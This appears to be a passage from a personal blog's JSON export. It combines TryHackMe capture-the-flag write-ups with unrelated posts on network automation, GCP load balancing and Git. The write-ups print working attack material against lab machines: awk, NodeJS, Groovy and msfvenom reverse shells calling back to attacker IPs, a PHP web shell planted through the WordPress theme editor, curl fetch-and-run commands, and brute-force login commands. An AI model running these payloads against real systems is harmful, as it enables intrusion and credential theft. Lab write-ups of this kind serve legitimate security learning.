Sup3rS3cretPickl3Ingred.txt Credentialed Enumeration (Continued) Another interesting file is clue.txt.\nc\u0026#34;a\u0026#34;t clue.txt For quicker enumeration a RSHELL was established.\n# Attackbox nc -nvlp 4444 # Target awk \u0026#39;BEGIN {s = \u0026#34;/inet/tcp/0/10.10.113.113/4444\u0026#34;; while(42) { do{ printf \u0026#34;shell\u0026gt;\u0026#34; |\u0026amp; s; s |\u0026amp; getline c; if(c){ while ((c |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; s; close(c); } } while(c != \u0026#34;exit\u0026#34;) close(s); }}\u0026#39; /dev/null Something interesting is found from Rick\u0026rsquo;s home folder.\nPrivilege Escalation to Root Running \u0026ldquo;sudo -l\u0026rdquo; shows that www-data user can run elevated commands without password.\nshell\u0026gt;sudo -l Matching Defaults entries for www-data on ip-10-10-32-60: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ip-10-10-32-60: (ALL) NOPASSWD: ALL With that a quick check with \u0026ldquo;ls\u0026rdquo; on root\u0026rsquo;s home folder reveals something interesting.\nChallenge completed.\n","permalink":"https://timo-juhani.github.io/logs/thm-pickle-rick/","summary":"\u003ch2 id=\"task\"\u003eTask\u003c/h2\u003e\n\u003cp\u003eThis Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle\u003c/p\u003e\n\u003ch2 id=\"enumeration\"\u003eEnumeration\u003c/h2\u003e\n\u003ch3 id=\"port-scan\"\u003ePort Scan\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap -sV -sC 10.10.93.106\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2024-08-16 10:26 BST\nNmap scan report for ip-10-10-93-106.eu-west-1.compute.internal (10.10.93.106)\nHost is up (0.00026s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Rick is sup4r cool\nMAC Address: 02:8E:DC:DD:72:CF (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.65 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"ssh-server\"\u003eSSH Server\u003c/h2\u003e\n\u003cp\u003eOnly accepts certificate based authentication.\u003c/p\u003e","title":"THM: Pickle Rick"},{"content":"Task Head over to jewel.uploadvulns.thm.\nTake what you\u0026rsquo;ve learned in this room and use it to get a shell on this machine. As per usual, your flag is in /var/www/. Bear in mind that this challenge will be an accumulation of everything you\u0026rsquo;ve learnt so far, so there may be multiple filters to bypass. The attached wordlist might help. Also remember that not all webservers have a PHP backend\u0026hellip;\nEnumeration First, I tried with a normal .jpg image. The image was uploaded succesfully, but the question is where. To be honest a better way would have been to inspect this with Burp to see the request-response flow in simultaneously.\nThe challenge included a wordlist (AAA-ZZZ three-letter combinations) that I reckon to be useful in finding the file. So I want to find the file that I just uploaded so that I know where my shell script can be found later on. Let\u0026rsquo;s find out with Gobuster.\ngobuster dir -u http://jewel.uploadvulns.thm -w uploadvulns.txt -x .jpg While Gobuster ran I checked on the webpage source code. There is reference to a static file but nothing more. Gobuster scan didn\u0026rsquo;t provide anything at this point. Most likely because the uploaded image is in a folder and I should enumerate the structure of the web page (this is an early morning and I haven\u0026rsquo;t had coffee yet 😅).\ngobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Gobuster scan found the following directories:\n/content (Status: 301) /modules (Status: 301) /admin (Status: 200) /assets (Status: 301) /Content (Status: 301) /Assets (Status: 301) /Modules (Status: 301) /Admin (Status: 200) Running the previous Gobuster command on \u0026ldquo;content\u0026rdquo; folder.\ngobuster dir -u http://jewel.uploadvulns.thm/content/ -w uploadvulns.txt -x .jpg The results show five files stored in the content folder.\n/ABH.jpg (Status: 200) /DOB.jpg (Status: 200) /LKQ.jpg (Status: 200) /SAD.jpg (Status: 200) /UAD.jpg (Status: 200) It seems that the application uses the wordlist provided in the task files to encode the uploaded images by rewriting the filename. The original file that I uploaded is called \u0026ldquo;DOB.jpg\u0026rdquo; now.\nReverse Shell Upload Next step is to upload a shell script and possibly bypass client and server side filters.\nChecking on the client side filters reveals that there are multiple conditions to match before the file is accepted by the application:\nThe upload is controlled by upload.js which checks The file size That the file\u0026rsquo;s magic number is ÿØÿ which links to jpg And the file extension should be either jpg or jpeg. At this point the type of web server backend is unknown. It could be PHP or something else. That needs to be known to choose the right shell script. Browsing to /admin and enumerating the page with Wappalyzer shows that the we\u0026rsquo;re dealing with Nginx 1.14.0 on Ubuntu and the language is NodeJS.\nRSHELL Script The reverse shell script for NodeJS.\nhttps://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#nodejs\n# The contents of shell.js (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(4242, \u0026#34;10.0.0.1\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application from crashing })(); Start a listener.\nnc -nvlp 4242 Evade Client-side Filters Intercept the file upload with Burp after removing ^js$| from Settings \u0026gt; Tools \u0026gt; Proxy \u0026gt; Request interception rules. This way Burp will intercept upload.js and we can modify it on the fly. At this point clearing the browser cache is a wonderful idea. After that refresh the page.\nMonitor the traffic flow in Burp and one request at a time forward them until you reach upload.js. At that point right click and click \u0026ldquo;Do Intercept \u0026gt; Response to this request\u0026rdquo;.\n# Remove client-side filter from upload.js and after that let it pass. //Check File Size if (event.target.result.length \u0026gt; 50 * 8 * 1024){ setResponseMsg(\u0026#34;File too big\u0026#34;, \u0026#34;red\u0026#34;);\treturn; } //Check Magic Number if (atob(event.target.result.split(\u0026#34;,\u0026#34;)[1]).slice(0,3) != \u0026#34;ÿØÿ\u0026#34;){ setResponseMsg(\u0026#34;Invalid file format\u0026#34;, \u0026#34;red\u0026#34;); return;\t} //Check File Extension const extension = fileBox.name.split(\u0026#34;.\u0026#34;)[1].toLowerCase(); if (extension != \u0026#34;jpg\u0026#34; \u0026amp;\u0026amp; extension != \u0026#34;jpeg\u0026#34;){ setResponseMsg(\u0026#34;Invalid file format\u0026#34;, \u0026#34;red\u0026#34;); return; } Evade Server-side Filters The file type is set to application/x-javascript. Changing that to image/jpeg and the file upload succeeds.\nFind RSHELL Script Run the same .jpg file scan with Gobuster again to find the shell script.\nExecute RSHELL Script The shell script can\u0026rsquo;t be executed just by browsing to the URL. Instead the admin page seems to provide means to do that. However, it says clearly that it runs commands from /modules directory and we know our script is in /content folder.\n# Traverse directories and execute reverse shell script. ../content/OFA.jpg The flag can be found from /var/www.\nLessons Learned Methodology matters the most. Otherwise this becomes frustrating quick. Keeping live notes helps to understand the status and the progress. Enumerating the structure and technology of the web application is key in file uploads. Remember to intercept .js requests and responses to disable client-side filtering easily. This wasn\u0026rsquo;t easy for me. But staying organized helped tremendeously. ","permalink":"https://timo-juhani.github.io/logs/thm-upload-vulnerabilities-challenge/","summary":"\u003ch2 id=\"task\"\u003eTask\u003c/h2\u003e\n\u003cp\u003eHead over to jewel.uploadvulns.thm.\u003c/p\u003e\n\u003cp\u003eTake what you\u0026rsquo;ve learned in this room and use it to get a shell on this machine. As per usual, your flag is in /var/www/. Bear in mind that this challenge will be an accumulation of everything you\u0026rsquo;ve learnt so far, so there may be multiple filters to bypass. The attached wordlist might help. Also remember that not all webservers have a PHP backend\u0026hellip;\u003c/p\u003e\n\u003ch2 id=\"enumeration\"\u003eEnumeration\u003c/h2\u003e\n\u003cp\u003eFirst, I tried with a normal .jpg image. The image was uploaded succesfully, but the question is where. To be honest a better way would have been to inspect this with Burp to see the request-response flow in simultaneously.\u003c/p\u003e","title":"THM: Upload Vulnerabilities Challenge"},{"content":"Have you ever tried to turn a serial link to a programming interface? Maybe not so listen. While it can be done I\u0026rsquo;m not sure if it\u0026rsquo;s a good idea.\nThe common starting for any new network is a bunch of dudes grabbing their blue Cisco console cables and going to work. Although PnP and zero touch provisioning protocols have become more common over the past years we\u0026rsquo;re not totally there yet.\nFor multiple reasons. Firstly because sometimes the supporting infra (DNS, DHCP you name it) is not there. Secondly there could be a pragmatic reason e.g. don\u0026rsquo;t get it don\u0026rsquo;t use it. Thirdly the tech doesn\u0026rsquo;t support it. Nevertheless the good old blue cable must come out of the back every now and then.\nEnter Tools for the People!\nOur situation might not be optimal but let\u0026rsquo;s try to use what we have. That\u0026rsquo;s why I started this project Blue in which the serial connection is used as an interface over which Python based program enters the device and performs onboarding tasks (v.0.0.1 covers only Cisco SDWAN). This way the stressed out admin can enjoy some degree of industrialization, even offload some of their work to other people and still make sure the job gets done the same way for the 100th time.\nI have to admit that the console link was quite tricky to get working reliably. The main pain points discovered:\nFind a reliable way to return the device to a known prompt. Some commands run for a loooooong time and therefore it\u0026rsquo;s hard to predict how long we should scan for a response on the console. For instance some commands provide a response instantaneously, some don\u0026rsquo;t respond at all and some only create a Syslog message. It\u0026rsquo;s tricky. Even if the commands seem to succeed it is a good idea to double check. The console link is super slow so for smaller devices therefore delays between commands are a must. In fact, after the bare minimum management configuration has been done it would be a grand idea to switchover to SSH for better reliability. More to come (maybe, I don\u0026rsquo;t know yet for sure).\nLink to the project: https://github.com/timo-juhani/blue\n","permalink":"https://timo-juhani.github.io/logs/blue-notes/","summary":"\u003cp\u003eHave you ever tried to turn a serial link to a programming interface? Maybe not so listen. While it can be done I\u0026rsquo;m not sure if it\u0026rsquo;s a good idea.\u003c/p\u003e\n\u003cp\u003eThe common starting for any new network is a bunch of dudes grabbing their blue Cisco console cables and going to work. Although PnP and zero touch provisioning protocols have become more common over the past years we\u0026rsquo;re not totally there yet.\u003c/p\u003e","title":"Blue Notes"},{"content":"How many times you have worked with networks that are outright insecure, vulnerable and unpatched?\nHow often do you hear any of these: a) We don\u0026rsquo;t have time to upgrade. b) We don\u0026rsquo;t have an SDN or a programmable API to do this. c) We got hacked because of a known software vulnerability. d) We just had a major incident because the software base is so old. e) We didn\u0026rsquo;t know networks need to be patched.\nIn reality most organizations have massive LAN networks. Therefore all points from a) to e) lead to a huge maintenance debt because they can\u0026rsquo;t keep up with the patching requirements.\nThe LAN Upgrade project solves the problem by implementing a Python based shell program that automates typical software management tasks required to operate and patch modern Cisco IOS-XE devices.\nThe design requirements for the project are:\nThe program runs over a standard management interface - SSH that is used by if not all then 99% of all organizations globally. Not all are willing to use RESTCONF or NETCONF just yet. That isn\u0026rsquo;t an excuse for fixing the issue. It uses multi-threading to run updates to multiple devices in parallel thus saving time and money. To reduce barriers of entry both technical and economical it uses open-source code available through PyPI that anyone can download such as Netmiko. It runs on a standard Linux operating system to allow flexible deployment and portability. Any user with some networking and Linux shell experience should be able to adopt this tool quickly. For the user it should feel like a no non-sense hacking tool. It doesn\u0026rsquo;t implement any fancy inventory database. Instead is relies on tools that we all know and have available. For inventory that should be either text editor or Excel. That said the inventory file should be trackable by Git. All organizations no matter which size or which region should have a basic capability to patch and operate secure networks. This should be fundamental as brushing teeth two times a day. When the foundation is rock solid everything else is easier. Tools for the people is a full on attack mindset. Instead of getting stuck with complex procurement processes and debate whether a certain tool is worth investing in we move and solve the problem with the tools that are available to all of us.\nLink to the project: https://github.com/timo-juhani/lan_upgrade\n","permalink":"https://timo-juhani.github.io/logs/tools-for-the-people/","summary":"\u003cp\u003eHow many times you have worked with networks that are outright insecure, vulnerable and unpatched?\u003c/p\u003e\n\u003cp\u003eHow often do you hear any of these:\na) We don\u0026rsquo;t have time to upgrade.\nb) We don\u0026rsquo;t have an SDN or a programmable API to do this.\nc) We got hacked because of a known software vulnerability.\nd) We just had a major incident because the software base is so old.\ne) We didn\u0026rsquo;t know networks need to be patched.\u003c/p\u003e","title":"Tools for the People"},{"content":"Earlier today I had an opportunity to setup and test a HTTP load balancer on Google Cloud Platform (GCP). I\u0026rsquo;m new to GCP and have only very limited hands-on experience on load balancers. Struggle was real. I try to explain it to myself next using the public documentation offered here as a skeleton:\nhttps://github.com/Qwiklearning/Challenge-lab/blob/main/GSP313%20Create%20and%20Manage%20Cloud%20Resources%3A%20Challenge%20Lab\nCompute It starts by creating an instance-template that can be used to replicate VMs that share the same configurations. The template here is a super basic one based on the requirements of GSP313 challenge.\ncloud compute instance-templates create web-server-template \\ --metadata-from-file startup-script=startup.sh \\ --machine-type e2-medium Then let\u0026rsquo;s create a MIG or a managed instance group. MIG is for creating multiple indentical VMs that host the application. MIG comes with features that help to scale up or down the service or heal from an incident. In this load balancing excerise using a MIG is natural choice because we just want to replicate the same application on multiple VMs.\ngcloud compute instance-groups managed create lb-backend-group \\ --size 2 \\ --template web-server-template Firewall rule to allow HTTP traffic is required. Opening port 80 for all backend VMs to punch a hole for the incoming web traffic. Frankly, it\u0026rsquo;s quite a huge hole for it allows all sources to chat with out web VMs. Which might be bad.. or not depending on the application.\ngcloud compute firewall-rules create web-server-firewall \\ --allow tcp:80 \\ That gives us the settings for two web VMs. To pool them together we need a load balancer. Otherwise publishing the application consisting of multiple VMs behind a single endpoint becomes quite a engineering task. In this case HTTP load balancer is used instead of network load balancer (NLB) which is another common option. If we opted for using an NLB we could only distribute the traffic based on IP and TCP port which might not give enough flexibility in the long run. If the application was super simple an NLB might be an option as well.\nLoad Balancing Health check is enabled so that we can determine whether the backend VMs respond to traffic correctly. Without health checks there wouldn\u0026rsquo;t be a mechanism for the load balancer to know which VM instances are doing ok. A broken instance could be a potential traffic black hole. That\u0026rsquo;s why we start by defining that object first.\nBackend gcloud compute http-health-checks create http-basic-check Modify the previously created MIG by assigning named ports. The configuration below assigns the name HTTP for port 80. This is an indication that HTTP service runs in all instances of MIG called lb-backend-group.\ngcloud compute instance-groups managed \\ set-named-ports lb-backend-group \\ --named-ports http:80 Create a backend service for the web servers. A backend service defines how to distribute the traffic to the two web servers. Adding to the backend service assigns our web servers to the load balancer. In this case the servers were defined by using an instance group. In other words there are two identical web servers behding the load balancer, they offer services using HTTP protocol and are monitored by the load balancer by a health check.\n# Backend service with a health check. gcloud compute backend-services create web-server-backend \\ --protocol HTTP \\ --http-health-checks http-basic-check \\ --global # Adding the web server instance-group to the backend service. gcloud compute backend-services add-backend web-server-backend \\ --instance-group lb-backend-group \\ --global Frontend URL map is created to route the incoming requests to the default backend service. In effect this is routing of web requests to their corresponding backend services. The target proxy configuration enables the termination of incoming client connections at the load balancer frontend while creating new connections from load balancer backend to the web servers. Putting URL map and target proxy settings together allows a way to connect clients\u0026rsquo; HTTP requests via proxy to the individual web server.\n# URL map gcloud compute url-maps create web-server-map \\ --default-service web-server-backend # Proxy gcloud compute target-http-proxies create http-lb-proxy \\ --url-map web-server-map Forwarding rule is created to direct the traffic to a load balancer which was defined above. In this case all traffic arriving to HTTP port will be forwarded to the load balancer which will then route the incoming web requests to the web servers.\ngcloud compute forwarding-rules create http-content-rule \\ --global \\ --target-http-proxy http-lb-proxy \\ --ports 80 Lessons learned: Understanding what you do is the most important. And for that reason the lack of my load balancing knowledge really turned this one into a mind bender for a moment. Don\u0026rsquo;t go forward until you understand. ","permalink":"https://timo-juhani.github.io/logs/gcp-http-load-balancer/","summary":"\u003cp\u003eEarlier today I had an opportunity to setup and test a HTTP load balancer on Google Cloud Platform (GCP). I\u0026rsquo;m new to GCP and have only very limited hands-on experience on load balancers. Struggle was real. I try to explain it to myself next using the public documentation offered here as a skeleton:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/Qwiklearning/Challenge-lab/blob/main/GSP313%20Create%20and%20Manage%20Cloud%20Resources%3A%20Challenge%20Lab\"\u003ehttps://github.com/Qwiklearning/Challenge-lab/blob/main/GSP313%20Create%20and%20Manage%20Cloud%20Resources%3A%20Challenge%20Lab\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"compute\"\u003eCompute\u003c/h2\u003e\n\u003cp\u003eIt starts by creating an instance-template that can be used to replicate VMs that share the same configurations. The template here is a super basic one based on the requirements of GSP313 challenge.\u003c/p\u003e","title":"GCP: HTTP Load Balancer"},{"content":"Sending and receiving LTE calls, messages and data without terrestrial LTE base stations is possible. Starlink has launched a service called Direct to Cell which works on any LTE handset. In their architecture the satellite works as an eNodeB which can be then integrated to a wider network and roaming partners.\nThis could be a start of something new. Time will tell.\nhttps://www.starlink.com/business/direct-to-cell\n","permalink":"https://timo-juhani.github.io/logs/lte-on-starlink/","summary":"\u003cp\u003eSending and receiving LTE calls, messages and data without terrestrial LTE base stations is possible. Starlink has launched a service called Direct to Cell which works on any LTE handset. In their architecture the satellite works as an eNodeB which can be then integrated to a wider network and roaming partners.\u003c/p\u003e\n\u003cp\u003eThis could be a start of something new. Time will tell.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.starlink.com/business/direct-to-cell\"\u003ehttps://www.starlink.com/business/direct-to-cell\u003c/a\u003e\u003c/p\u003e","title":"LTE on Starlink"},{"content":"Although I\u0026rsquo;m not a coder by profession, I\u0026rsquo;ve been coding quite a bit during the recent months. While doing that I\u0026rsquo;ve tried to improve my coding principles.\nI stumbled onto functional programming. While the concept is everything but new in 2024 I had not really looked into it if you don\u0026rsquo;t count in pure functions.\nSo the scenario is like this: In Python it\u0026rsquo;s quite common that you end up using data structures like a list of dictionaries as a defacto weapon of choice. And of course there is nothing wrong with that. In my cases however those have proven to be error-prone from time to time.\nMainly I\u0026rsquo;m talking about code like this:\ninput = [ {\u0026#34;name\u0026#34;: \u0026#34;Bob\u0026#34;, \u0026#34;age\u0026#34;: 24}, {\u0026#34;name\u0026#34;: \u0026#34;Alice\u0026#34;, \u0026#34;age\u0026#34;: 30} ] The main issue with this approach is that the input data and data structure can be modified at will. That\u0026rsquo;s not ideal to say the least and could cause quite annoying issues in the long run.\nUsing immutable data structures solves this issue effectively. Immutable? In plain Finnish it means that the data can\u0026rsquo;t be altered. In Python you would implement it like this:\nimport collections Person = collections.namedtuple(\u0026#34;Person\u0026#34;, [\u0026#34;name\u0026#34;, \u0026#34;age\u0026#34;]) input = ( Person(name=\u0026#34;Bob\u0026#34;, age=24), Person(name=\u0026#34;Alica\u0026#34;, age=30), ) Person class is a namedtuple locking the keys used for the data. This way there is no way a fat finger typo breaks the code when adding new data. The tuple input locks the data itself. In comparison: If a list would be used instead of a tuple there would be no way we could stop changes to the orignal input data as the program runs.\nMoving forward I\u0026rsquo;ll try to actively find opportunities to employ this technique. To me protecting the input data makes a whole lot of sense.\n","permalink":"https://timo-juhani.github.io/logs/immutable-data/","summary":"\u003cp\u003eAlthough I\u0026rsquo;m not a coder by profession, I\u0026rsquo;ve been coding quite a bit during the recent months. While doing that I\u0026rsquo;ve tried to improve my coding principles.\u003c/p\u003e\n\u003cp\u003eI stumbled onto functional programming. While the concept is everything but new in 2024 I had not really looked into it if you don\u0026rsquo;t count in pure functions.\u003c/p\u003e\n\u003cp\u003eSo the scenario is like this: In Python it\u0026rsquo;s quite common that you end up using data structures like a list of dictionaries as a defacto weapon of choice. And of course there is nothing wrong with that. In my cases however those have proven to be error-prone from time to time.\u003c/p\u003e","title":"Immutable Data"},{"content":"Box: Internal\nPlatform: Try Hack Me\nGrade: Hard\nService Enumeration sudo nmap -sC -sV 10.10.52.194 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA) | 256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA) |_ 256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.57 seconds SSH OpenSSH 7.6p1.\nWeb Apache httpd 2.4.29.\nOnly default page is shown. The logical next step is to try to find the directory structure of the server.\ngobuster dir -u http://10.10.52.194 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 --no-error http://10.10.52.194/phpmyadmin/index.php http://10.10.52.194/blog http://10.10.52.194/wordpress It seems the site is running Worpress. Trying to log to phpmyadmin with default credentials doesn\u0026rsquo;t work. Browsing to /wordpress shows that the page tries to reach out to its own domain name internal.thm. Adding that to /etc/hosts.\nWordpress Running WPScan to reveal potential vulnerabilities.\nsudo wpscan -e ap -t 500 --url http://internal.thm/blog WordPress 5.4.2 and no plugins installed. Which is a bummer because plugins are a great point of entry.\nTrying the WP admin panel at http://internal.thm/blog/wp-login.php to enumerate valid usernames. Admin is a valid user according to error message.\nAt this point I couldn\u0026rsquo;t find an obvious vulnerability for WP so I resorted to trying to brute force the admin login. I\u0026rsquo;m not a fan of brute forcing anything so this should be used as a last resort if nothing else offers an opportunity.\nsudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/wordpress Much to my surprise brute force attempt was succesful and I found the admin password. The next step is easy. Let\u0026rsquo;s attempt to exploit WP Themes Editor.\nInitial Access So logged in as admin browsing to Theme Editor. Edit Twenty Seventeen: 404 Template\n# Adding a simple web shell after the initial comments. system($_GET[cmd]); # Testing the shell curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data) # Enumerating OS users curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=cat+/etc/passwd aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false So it seems that the system has one standard user and one service account user which suggest MySQL runs on the box.\nWebshell works but the next step is to upgrade the shell.\nShell Upgrade # Create shell and listener msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.67.91 LPORT=4444 -f elf \u0026gt; shell.elf rlwrap nc -nvlp 4444 # Enable Python web server python -m http.server 8000 # Execute the shell curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=curl+http://10.11.67.91:8000/shell.elf+-o+/tmp/shell.elf curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=chmod+700+/tmp/shell.elf curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=/tmp/shell.elf # Upgrade to interactive python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Operating System Enumeration The config file wp-config.php reveals a hardcoded MySQL username and password.\ncat wp-config.php | grep \u0026#39;DB_USER\\|DB_PASSWORD\u0026#39; \u0026lt;ss$ cat wp-config.php | grep \u0026#39;DB_USER\\|DB_PASSWORD\u0026#39; define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpress\u0026#39; ); MySQL Enumeration show databases; use wordpress; show tables; select * from wp_users; Only admin user was found. It doesn\u0026rsquo;t give anything new as I already have WP admin account.\nPrivilege Escalation Manual enumeration was a dead end at this point so running LinPEAS seemed like a good idea to check whether I had missed something.\n# Get the code curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh # Move to target, set permissions and run. ./linpeas.sh # Found another user and a password. phpmyadmin phpMyAdmin Enumeration phpMyAdmin is a web-based MySQL db management tool based on PHP and hosted on a web server.\n5.7.31\nThis version seems to suffer from CVE-2016-6663.\nExploit code is availabe: https://www.exploit-db.com/exploits/40678\nTo be able to escalate privileges I need mysql user account. I could try to upload a rshell using phpMyAdmin.\nLinux Password Hunt I started to have a feeling that I was making this more complicated than needed so I went back to basics.\n# Looking for file content related to known user accounts grep -r -l \u0026#39;aubreanna\u0026#39; / 2\u0026gt;/dev/null # Interesting file that seems to include password for aubreanna /opt/wp-save.txt Lateral Movement # SSH in ssh -l aubreanna internal.thm User flag in /home/aubreanna. Also home folder contains a message that Jenkins is running on 172.17.0.2:8080. This should be cool because it has a live console. Running ip a tells that the Jenkins instance is running as a Docker container.\nPivoting to Jenkins ssh -L 1234:172.17.0.2:8080 aubreanna@internal.thm Jenkins can be accessed now with attack box\u0026rsquo;s browser: localhost:1234\nDefault credentials (admin:password) doesn\u0026rsquo;t work. Also because it runs as a Docker container and aubreanna doesn\u0026rsquo;t have rights to manage Docker I can\u0026rsquo;t do much. The last resort remain: Let\u0026rsquo;s try brute force login.\nFirst intercept the login attempt, send to Burp and save it to a file.\n# Request POST /j_acegi_security_check HTTP/1.1 Host: localhost:1234 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 53 Origin: http://localhost:1234 Connection: close Referer: http://localhost:1234/loginError Cookie: JSESSIONID.6c9a373a=node02dnek68vlg0llcj0gww2jm60.node0; JSESSIONID.bbc44c3d=node0ffzdsnmx4z1611tao9l27umlj0.node0 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 j_username=admin\u0026amp;j_password=PASS\u0026amp;from=\u0026amp;Submit=Sign+in # Launching the attack with Hydra hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 1234 http-post-form \u0026#34;/j_acegi_security_check:j_username=admin\u0026amp;j_password=^PASS^\u0026amp;from=%2F\u0026amp;Submit=Sign+in:Invalid username or password\u0026#34; Hydra was able to find the password for admin.\nJenkins Exploit Let\u0026rsquo;s head over to script console at http://localhost:1234/script.\n# Webshell def cmd = \u0026#39;id\u0026#39; def sout = new StringBuffer(), serr = new StringBuffer() def proc = cmd.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println sout uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins) Webshell is great but reverse shell is better. Let\u0026rsquo;s install one.\n# Attack box rlwrap nc -nvlp 4444 r = Runtime.getRuntime() p = r.exec([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;exec 5\u0026lt;\u0026gt;/dev/tcp/10.11.67.91/4444;cat \u0026lt;\u0026amp;5 | while read line; do \\$line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done\u0026#34;] as String[]) p.waitFor() As Jenkins is running as a Docker container the next step would be break out from the container to the host system.\nJenkins Enumeration There is an interesting file in /opt called note.txt that reveals something very disturbing. So no need for Docker breakout.\nRoot Access With the information SSH in as root and get the root flag.\nAfter Action Review Jenkins was easy to brute force with Hydra but same attack didn\u0026rsquo;t work with ffuf. I don\u0026rsquo;t know why. Annoying. Don\u0026rsquo;t neglect looking for files that reveal important information. Doing a write up while testing was excellent for processing thoughts and making progress in a logical manner. This was a fun box! ","permalink":"https://timo-juhani.github.io/logs/internal-write-up/","summary":"\u003cp\u003eBox: Internal\u003cbr\u003e\nPlatform: Try Hack Me\u003cbr\u003e\nGrade: Hard\u003c/p\u003e\n\u003ch2 id=\"service-enumeration\"\u003eService Enumeration\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo nmap -sC -sV 10.10.52.194\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)\n|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)\n|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.57 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"ssh\"\u003eSSH\u003c/h3\u003e\n\u003cp\u003eOpenSSH 7.6p1.\u003c/p\u003e","title":"Internal Write Up"},{"content":"I had a recurring annoyance of running Gitlab instances in the lab. No matter whether I used Docker or just normal Gitlab instance at some point it broke or didn\u0026rsquo;t want to upgrade without grief. Frankly, I don\u0026rsquo;t have time to fix broken tools. Instead I need a hammer that is maintenance free. I got back to basics by implementing a bare minimum Git setup like this.\n# Server # Create a root folder for all projects mkdir ~/projects cd projects mkdir sampleproject.git cd sampleproject.git git init --bare --shared=group # Client git clone ssh://\u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt;/home/\u0026lt;user\u0026gt;/sampleproject.git cd sampleproject touch README.md git add README.md git commit -m \u0026#34;add file\u0026#34; git push origin main That\u0026rsquo;s it. Another client can clone the repo normally and pull / push changes whenever needed.\nMimimize. minimize. 